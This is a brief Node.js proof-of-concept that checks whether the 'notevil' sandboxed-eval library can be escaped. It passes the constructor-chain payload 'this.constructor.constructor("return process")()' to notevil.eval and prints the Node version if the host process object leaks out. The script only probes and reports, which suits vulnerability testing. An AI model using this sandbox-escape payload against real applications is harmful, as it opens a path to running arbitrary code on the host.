const notevil = require('notevil');
try {
  let res = notevil.eval('this.constructor.constructor("return process")()', Object.create(null));
  console.log('Vulnerable?', res.version);
} catch (e) {
  console.log('Error:', e.message);
}
